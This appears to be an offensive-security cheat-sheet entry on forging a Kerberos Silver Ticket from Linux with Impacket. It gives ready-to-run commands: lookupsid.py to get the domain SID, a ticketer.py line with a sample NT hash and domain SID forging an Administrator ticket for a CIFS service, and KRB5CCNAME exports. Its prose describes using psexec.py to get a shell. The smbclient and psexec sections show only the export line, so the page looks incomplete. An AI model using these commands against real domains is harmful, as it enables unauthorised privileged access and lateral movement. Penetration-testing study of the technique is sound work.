# 09.13 Silver Ticket Linux

> Forge a Silver TGS with `ticketer.py -spn` — Impacket rewrites the SPN on the fly to hit alternate services on the same host.

## Overview

On Linux, lookupsid.py retrieves the domain SID, then ticketer.py with -spn forges the Silver Ticket TGS. Exporting to KRB5CCNAME lets smbclient.py -k browse shares, or psexec.py -k -no-pass gets a shell. Impacket rewrites the SPN on the fly when the exact SPN is not cached, enabling access to alternate services on the same host.

## Steps

- Retrieve domain SID with lookupsid.py.
- Forge with ticketer.py -nthash service_hash -domain-sid SID -domain domain -spn cifs/target username.
- Export KRB5CCNAME=./Administrator.ccache.
- Browse shares with smbclient.py -k -no-pass target, or shell with psexec.py -k -no-pass target.

## Commands

### lookupsid get domain SID

```bash
lookupsid.py <DOMAIN>.local/[email protected] -domain-sids
```

### ticketer forge Silver Ticket

```bash
ticketer.py -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain <DOMAIN>.local -spn cifs/sql01.<DOMAIN>.local Administrator
```

### smbclient with Silver Ticket

```bash
export KRB5CCNAME=./Administrator.ccache
```

### psexec with Silver Ticket

```bash
export KRB5CCNAME=./Administrator.ccache
```
